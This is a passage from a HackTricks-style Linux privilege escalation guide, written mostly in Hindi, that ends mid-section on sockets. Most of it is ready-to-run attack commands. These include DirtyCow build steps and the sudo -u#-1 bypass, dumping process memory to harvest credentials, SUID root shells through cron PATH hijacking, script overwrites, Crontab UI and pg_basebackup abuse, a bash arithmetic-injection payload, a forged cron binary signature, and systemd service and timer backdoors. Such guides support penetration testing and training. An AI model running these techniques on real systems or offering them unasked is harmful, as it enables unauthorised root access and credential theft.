# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## System Information

### OS info

चल रहे OS के बारे में जानकारी एकत्र करना शुरू करते हैं।
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

यदि आप **`PATH` वेरिएबल के अंदर किसी भी फ़ोल्डर पर लिखने की अनुमतियाँ रखते हैं** तो आप कुछ लाइब्रेरीज़ या बाइनरीज़ को हाईजैक कर सकते हैं:
```bash
echo $PATH
```
### Env info

क्या environment variables में कोई दिलचस्प जानकारी, passwords या API keys हैं?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

जांच करें कि kernel version क्या है और क्या कोई exploit है जिसका उपयोग escalate privileges के लिए किया जा सकता है।
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
आप यहाँ एक अच्छा vulnerable kernel list और कुछ पहले से ही **compiled exploits** पा सकते हैं: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
अन्य साइटें जहाँ आप कुछ **compiled exploits** पा सकते हैं: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

उस वेबसाइट से सभी vulnerable kernel versions निकालने के लिए आप कर सकते हैं:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Kernel exploits खोजने में मदद करने वाले टूल:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (victim पर चलाएँ, केवल kernel 2.x के लिए exploits चेक करता है)

हमेशा **Google में kernel version खोजें**, हो सकता है कि आपका kernel version किसी kernel exploit में लिखा हो और तब आप सुनिश्चित हो जाएंगे कि वह exploit वैध है।

Additional kernel exploitation techniques:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo version

निम्नलिखित में दिखाई देने वाले vulnerable sudo versions के आधार पर:
```bash
searchsploit sudo
```
आप इस grep का उपयोग करके देख सकते हैं कि sudo का version vulnerable है या नहीं।
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo के 1.9.17p1 से पहले के वर्ज़न (**1.9.14 - 1.9.17 < 1.9.17p1**) बिना विशेषाधिकार वाले लोकल उपयोगकर्ताओं को sudo `--chroot` ऑप्शन के माध्यम से root तक अपनी privileges escalate करने की अनुमति देते हैं जब `/etc/nsswitch.conf` फाइल किसी user controlled directory से उपयोग की जाती है।

Here is a [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Exploit चलाने से पहले, सुनिश्चित करें कि आपका `sudo` version vulnerable है और यह `chroot` फीचर को सपोर्ट करता है।

For more information, refer to the original [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

From @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg सिग्नेचर सत्यापन विफल

देखें **smasher2 box of HTB** — इस बात का **उदाहरण** कि इस vuln का कैसे exploited किया जा सकता है।
```bash
dmesg 2>/dev/null | grep "signature"
```
### अधिक system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## संभावित सुरक्षा उपाय सूचीबद्ध करें

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

यदि आप एक container के अंदर हैं, तो निम्न container-security सेक्शन से शुरू करें और फिर runtime-specific abuse पेजों में pivot करें:


{{#ref}}
container-security/
{{#endref}}

## ड्राइव्स

जांचें **क्या mounted और unmounted हैं**, कहाँ और क्यों। अगर कुछ unmounted है तो आप उसे mount करने की कोशिश कर सकते हैं और निजी जानकारी की जाँच कर सकते हैं।
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## उपयोगी सॉफ़्टवेयर

उपयोगी बाइनरी सूचीबद्ध करें
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
साथ ही जाँच करें कि **any compiler is installed**। यह तब उपयोगी है जब आपको कोई kernel exploit उपयोग करना पड़े, क्योंकि सुझाया जाता है कि इसे उसी machine पर compile करें जहाँ आप इसका उपयोग करने जा रहे हैं (या किसी समान machine पर)।
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### कमजोर सॉफ़्टवेयर स्थापित

स्थापित पैकेज और सेवाओं के **संस्करण** की जाँच करें। शायद कोई पुराना Nagios संस्करण (उदाहरण के लिए) हो जिसे escalating privileges के लिए exploited किया जा सके…\
अनुशंसित है कि अधिक संदिग्ध इंस्टॉल किए गए सॉफ़्टवेयर के संस्करण को मैन्युअल रूप से जाँचें।
```bash
dpkg -l #Debian
rpm -qa #Centos
```
यदि आपके पास मशीन तक SSH पहुँच है, तो आप मशीन में इंस्टॉल किए गए पुराने और असुरक्षित सॉफ़्टवेयर की जाँच करने के लिए **openVAS** का भी उपयोग कर सकते हैं।

> [!NOTE] > _ध्यान दें कि ये कमांड्स बहुत सारी जानकारी दिखाएँगे जो अधिकांशतः बेकार होगी, इसलिए OpenVAS या समान कुछ applications की सिफारिश की जाती है जो जाँचते हैं कि कोई इंस्टॉल किया गया सॉफ़्टवेयर संस्करण known exploits के लिए असुरक्षित है या नहीं_

## Processes

देखें कि **कौन से प्रोसेस** चल रहे हैं और जाँचें कि क्या किसी प्रोसेस के पास **अपेक्षित से अधिक अधिकार** हैं (शायद एक tomcat root द्वारा चलाया जा रहा हो?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Also **check your privileges over the processes binaries**, maybe you can overwrite someone.

### Process monitoring

आप process मॉनिटर करने के लिए [**pspy**](https://github.com/DominicBreuker/pspy) जैसे tools का उपयोग कर सकते हैं। यह उन vulnerable processes की पहचान करने में बहुत उपयोगी हो सकता है जो अक्सर execute होते हैं या जब कुछ requirements पूरी होती हैं।

### Process memory

कुछ server services memory के अंदर clear text में **credentials** save कर देती हैं।\
सामान्यतः दूसरे users के processes की memory पढ़ने के लिए आपको **root privileges** चाहिए होता है, इसलिए यह आम तौर पर तब ज़्यादा फ़ायदेमंद होता है जब आप पहले से root हैं और और भी credentials खोजना चाहते हैं।\
हालाँकि, ध्यान रखें कि **as a regular user you can read the memory of the processes you own**।

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

यदि आपके पास किसी FTP service की memory तक access है (उदाहरण के लिए) तो आप Heap प्राप्त कर सकते हैं और उसके भीतर उसके credentials खोज सकते हैं।
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB स्क्रिप्ट
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

किसी दिए गए process ID के लिए, **maps दिखाते हैं कि memory उस प्रक्रिया के virtual address space में कैसे mapped है**; यह प्रत्येक mapped region की **permissions** भी दिखाता है। यह **mem** pseudo file **प्रोसेस की memory स्वयं उजागर करता है**। **maps** फ़ाइल से हमें पता चलता है कि कौन से **memory regions readable हैं** और उनके offsets क्या हैं। हम इस जानकारी का उपयोग करके **mem file में seek करके सभी readable regions को एक फ़ाइल में dump करते हैं**।
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` सिस्टम की **भौतिक** मेमोरी तक पहुँच प्रदान करता है, न कि वर्चुअल मेमोरी तक। कर्नल के वर्चुअल एड्रेस स्पेस तक /dev/kmem के माध्यम से पहुँचा जा सकता है.\
आमतौर पर, `/dev/mem` केवल **root** और **kmem** group द्वारा पढ़ा जा सकता है.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump के लिए linux

ProcDump, Windows के लिए Sysinternals suite के क्लासिक ProcDump टूल का Linux में पुनर्कल्पित संस्करण है। इसे प्राप्त करें [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### टूल्स

process memory को dump करने के लिए आप उपयोग कर सकते हैं:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_आप मैन्युअल रूप से root आवश्यकताओं को हटा कर आपके स्वामित्व वाली process को dump कर सकते हैं
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root आवश्यक है)

### Process Memory से Credentials

#### मैनुअल उदाहरण

यदि आप पाते हैं कि authenticator process चल रहा है:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
आप process को dump कर सकते हैं (पहले के sections देखें ताकि process की memory को dump करने के विभिन्न तरीके मिलें) और memory के अंदर credentials खोजें:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

यह टूल [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **steal clear text credentials from memory** और कुछ **well known files** से जानकारी प्राप्त करेगा। सही तरीके से काम करने के लिए इसे root privileges की आवश्यकता होती है।

| विशेषता                                           | प्रोसेस नाम           |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron जॉब्स

### Crontab UI (alseambusher) root के रूप में चल रहा है – web-based scheduler privesc

यदि एक वेब “Crontab UI” पैनल (alseambusher/crontab-ui) root के रूप में चल रहा है और केवल loopback पर बाउंड है, तो आप इसे SSH local port-forwarding के माध्यम से पहुँच सकते हैं और privilege प्राप्त करने के लिए एक privileged job बना सकते हैं।

सामान्य चेन
- केवल loopback पर मौजूद पोर्ट खोजें (उदा., 127.0.0.1:8000) और Basic-Auth realm का पता लगाएँ `ss -ntlp` / `curl -v localhost:8000` के माध्यम से
- ऑपरेशनल आर्टिफेक्ट्स में क्रेडेंशियल्स खोजें:
  - Backups/scripts जिनमें `zip -P <password>` का उपयोग किया गया हो
  - systemd unit जो `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` को एक्सपोज़ कर रहा हो
- Tunnel and login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- एक high-priv job बनाएं और इसे तुरंत चलाएँ (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- इसका उपयोग करें:
```bash
/tmp/rootshell -p   # root shell
```
हार्डनिंग
- Crontab UI को root के रूप में न चलाएँ; इसे एक समर्पित उपयोगकर्ता और न्यूनतम अनुमतियों के साथ सीमित रखें
- localhost पर bind करें और अतिरिक्त रूप से firewall/VPN के माध्यम से एक्सेस सीमित करें; पासवर्ड पुन: उपयोग न करें
- unit files में secrets एम्बेड करने से बचें; secret stores या root-only EnvironmentFile का उपयोग करें
- on-demand job executions के लिए audit/logging सक्षम करें



जाँचें कि कोई scheduled job vulnerable तो नहीं है। शायद आप root द्वारा execute किए जाने वाले किसी script का फायदा उठा सकें (wildcard vuln? root द्वारा उपयोग की जाने वाली फाइलों को modify कर सकते हैं? use symlinks? उस directory में specific files बना सकते हैं जिसे root उपयोग करता है?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

उदाहरण के लिए, _/etc/crontab_ के अंदर आप PATH पा सकते हैं: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_ध्यान दें कि user के पास /home/user पर लिखने की अनुमति है_)

यदि इस crontab में root किसी command या script को PATH सेट किए बिना execute करने की कोशिश करता है। उदाहरण के लिए: _\* \* \* \* root overwrite.sh_\
तो, आप निम्नलिखित का उपयोग करके root shell प्राप्त कर सकते हैं:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron का उपयोग करते हुए एक script जिसमें wildcard हो (Wildcard Injection)

यदि root द्वारा चलाया गया कोई script किसी command के अंदर “**\***” मौजूद है, तो आप इसका फायदा उठाकर अप्रत्याशित चीजें (जैसे privesc) कर सकते हैं। उदाहरण:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**यदि wildcard किसी path के पहले आता है जैसे** _**/some/path/\***_ **, तो यह vulnerable नहीं है (यहाँ तक कि** _**./\***_ **भी नहीं)।**

Read the following page for more wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash performs parameter expansion and command substitution before arithmetic evaluation in ((...)), $((...)) and let. If a root cron/parser reads untrusted log fields and feeds them into an arithmetic context, an attacker can inject a command substitution $(...) that executes as root when the cron runs.

- Why it works: Bash में expansions इस क्रम में होते हैं: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. So a value like `$(/bin/bash -c 'id > /tmp/pwn')0` is first substituted (running the command), then the remaining numeric `0` is used for the arithmetic so the script continues without errors.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Attacker-controlled text को parsed log में लिखवाइए ताकि numeric-looking field में command substitution हो और वह एक digit पर खत्म हो। Ensure your command does not print to stdout (or redirect it) so the arithmetic remains valid.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

If you **can modify a cron script** executed by root, you can get a shell very easily:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
अगर root द्वारा चलाया गया script किसी ऐसे **directory where you have full access** का उपयोग करता है, तो उस फ़ोल्डर को हटाकर और उसकी जगह किसी दूसरे फ़ोल्डर की ओर **create a symlink folder to another one** बना देना उपयोगी हो सकता है, जो आपके नियंत्रण वाले script को serve करे।
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Symlink validation और सुरक्षित फ़ाइल हैंडलिंग

जब आप privileged scripts/binaries की समीक्षा कर रहे हों जो path द्वारा फ़ाइलें पढ़ते या लिखते हैं, तो सत्यापित करें कि links कैसे हैंडल होते हैं:

- `stat()` एक symlink का पालन करता है और target का metadata लौटाता है।
- `lstat()` link खुद का metadata लौटाता है।
- `readlink -f` और `namei -l` अंतिम target को resolve करने और प्रत्येक path component की permissions दिखाने में मदद करते हैं।
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
For defenders/developers, safer patterns against symlink tricks include:

- `O_EXCL` with `O_CREAT`: यदि पाथ पहले से मौजूद है तो फेल करें (blocks attacker pre-created links/files).
- `openat()`: किसी trusted directory file descriptor के सापेक्ष ऑपरेट करें.
- `mkstemp()`: secure permissions के साथ temporary फ़ाइलें atomically बनाएं.

### Custom-signed cron binaries with writable payloads
Blue teams कभी-कभी cron-driven binaries को "sign" करते हैं: वे एक custom ELF section dump करके और vendor string के लिए grep करते हैं, फिर उन्हें root के रूप में execute करते हैं. अगर वह binary group-writable है (e.g., `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) और आप signing material को leak कर सकते हैं, तो आप section को forge करके cron task hijack कर सकते हैं:

1. `pspy` का उपयोग करके verification flow capture करें. In Era, root ने `objcopy --dump-section .text_sig=text_sig_section.bin monitor` चलाया, उसके बाद `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` और फिर फ़ाइल execute की.
2. leaked key/config (from `signing.zip`) का उपयोग करके अपेक्षित certificate पुनर्निर्मित करें:
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. एक malicious replacement बनाएँ (उदा., drop a SUID bash, add your SSH key) और certificate को `.text_sig` में embed करें ताकि grep पास हो:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Execute bits को बनाए रखते हुए scheduled binary को overwrite करें:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. अगले cron रन का इंतज़ार करें; जब naive signature check पास हो जाएगा, तो आपका payload root के रूप में चलेगा.

### बार-बार चलने वाले cron jobs

आप processes को monitor कर सकते हैं ताकि उन processes को खोजा जा सके जो प्रत्येक 1, 2 या 5 मिनट पर execute होते हैं. शायद आप इसका लाभ उठाकर privileges escalate कर सकें.

उदाहरण के लिए, **1 मिनट के दौरान हर 0.1s पर मॉनिटर करने के लिए**, **कम से कम चलने वाले कमांड्स के अनुसार sort करने के लिए** और जिन कमांड्स को सबसे अधिक execute किया गया है उन्हें delete करने के लिए, आप कर सकते हैं:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**आप यह भी उपयोग कर सकते हैं** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (यह हर शुरू होने वाली प्रक्रिया को मॉनिटर और सूचीबद्ध करेगा)।

### Root बैकअप जो हमलावर द्वारा सेट किए गए मोड बिट्स को संरक्षित करते हैं (pg_basebackup)

अगर एक root-स्वामित्व वाला cron `pg_basebackup` (या कोई भी recursive copy) को उस database directory के खिलाफ चलाता है जिसे आप लिख सकते हैं, तो आप एक **SUID/SGID binary** लगा सकते हैं जिसे बैकअप आउटपुट में समान मोड बिट्स के साथ **root:root** के रूप में फिर से कॉपी किया जाएगा।

Typical discovery flow (as a low-priv DB user):
- `pspy` का उपयोग करके हर मिनट `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` जैसी कॉल करता हुआ root cron ढूंढें।
- पुष्टि करें कि स्रोत क्लस्टर (उदा., `/var/lib/postgresql/14/main`) आपके द्वारा writable है और जॉब के बाद destination (`/opt/backups/current`) root का स्वामित्व बन जाता है।

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
यह इसलिए काम करता है क्योंकि `pg_basebackup` क्लस्टर कॉपी करते समय फ़ाइल मोड बिट्स को संरक्षित करता है; जब इसे root द्वारा चलाया जाता है तो destination फ़ाइलें **root ownership + attacker-chosen SUID/SGID** अपनाती हैं। कोई भी समान privileged backup/copy रूटीन जो permissions बनाए रखता है और किसी executable स्थान में लिखता है, प्रभावित हो सकता है।

### अदृश्य cron jobs

यह संभव है कि एक cronjob बनाई जाए जो **टिप्पणी के बाद एक कैरेज रिटर्न रखे** (newline character के बिना), और cron job काम करेगा। उदाहरण (ध्यान दें कैरेज रिटर्न कैरेक्टर):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Services

### Writable _.service_ files

देखें कि क्या आप किसी `.service` फ़ाइल को लिख सकते हैं, अगर कर सकते हैं तो आप इसे संशोधित कर सकते हैं ताकि यह आपके **backdoor** को **execute** करे जब service **started**, **restarted** या **stopped** हो (शायद आपको मशीन के reboot होने तक इंतज़ार करना पड़े)।\
उदाहरण के लिए .service फ़ाइल के अंदर अपना backdoor रखें जैसे **`ExecStart=/tmp/script.sh`**

### Writable service binaries

ध्यान रखें कि यदि आपके पास **write permissions over binaries being executed by services**, तो आप उन्हें backdoors के लिए बदल सकते हैं ताकि जब services फिर से re-executed हों तो backdoors execute हों।

### systemd PATH - Relative Paths

आप **systemd** द्वारा उपयोग किए जाने वाले **PATH** को इस तरह देख सकते हैं:
```bash
systemctl show-environment
```
यदि आप पाते हैं कि आप पथ के किसी भी फ़ोल्डर में **write** कर सकते हैं, तो आप संभवतः **escalate privileges** कर पाएंगे। आपको **relative paths being used on service configurations** जैसी फ़ाइलों में तलाश करनी चाहिए, जैसे:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
फिर, उस systemd PATH फ़ोल्डर के अंदर जिसे आप लिख सकते हैं, उसी नाम का एक **executable** बनाइए जो relative path binary के समान हो, और जब service से vulnerable action (**Start**, **Stop**, **Reload**) execute करने के लिए कहा जाएगा, आपका **backdoor** executed होगा (अनप्रिविलेज्ड उपयोगकर्ता आमतौर पर सेवाएँ start/stop नहीं कर पाते — लेकिन जाँच करें कि क्या आप `sudo -l` का उपयोग कर सकते हैं)।

**Learn more about services with `man systemd.service`.**

## **Timers**

**Timers** systemd के unit files होते हैं जिनके नाम का अंत `**.timer**` में होता है और ये `**.service**` फ़ाइलों या इवेंट्स को नियंत्रित करते हैं। **Timers** को cron के विकल्प के रूप में उपयोग किया जा सकता है क्योंकि इनमें calendar time events और monotonic time events के लिए built-in सपोर्ट होता है और इन्हें asynchronously चलाया जा सकता है।

आप सभी timers को सूचीबद्ध कर सकते हैं:
```bash
systemctl list-timers --all
```
### लिखने योग्य टाइमर

यदि आप किसी टाइमर को संशोधित कर सकते हैं, तो आप इसे systemd.unit के कुछ मौजूदा यूनिट्स (जैसे `.service` या `.target`) को निष्पादित करने के लिए बना सकते हैं।
```bash
Unit=backdoor.service
```
In the documentation you can read what the Unit is:

> जब यह timer समाप्त होता है तो सक्रिय होने वाला unit। आर्गुमेंट एक unit नाम है, जिसका suffix ".timer" नहीं है। यदि निर्दिष्ट नहीं किया गया है, तो यह मान उस service पर डिफ़ॉल्ट होता है जिसका नाम timer unit के समान होता है, सिवाय suffix के। (ऊपर देखें.) यह अनुशंसित है कि जो unit नाम सक्रिय किया जाता है और timer unit का unit नाम suffix को छोड़कर समान हों।

Therefore, to abuse this permission you would need to:

- ऐसा कोई systemd unit ढूँढें (जैसे `.service`) जो **executing a writable binary** हो
- ऐसा कोई systemd unit ढूँढें जो **executing a relative path** हो और आपके पास **writable privileges** उस **systemd PATH** पर हों (उस executable की impersonate करने के लिए)

**Learn more about timers with `man systemd.timer`.**

### **टाइमर सक्षम करना**

टाइमर को सक्षम करने के लिए आपको root privileges की आवश्यकता होती है और निम्न को execute करना होगा:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## सॉकेट्स

Unix Domain Sockets (UDS) client-server मॉडल्स में एक ही या अलग मशीनों पर **प्रोसेस संचार** को सक्षम करते हैं। वे कंप्यूटरों के बीच संचार के लिए मानक Unix descriptor फ़ाइलों का उपयोग करते हैं और `.socket` फ़ाइलों के माध्यम से सेट अप किए जाते हैं।

Sockets को `.socket` फ़ाइलों का उपयोग करके कॉन्फ़िगर किया जा सकता है।

**sockets के बारे में अधिक जानने के लिए `man systemd.socket` देखें।** इस फ़ाइल के अंदर कई दिलचस्प पैरामीटर कॉन्फ़िगर किए जा सकते हैं:

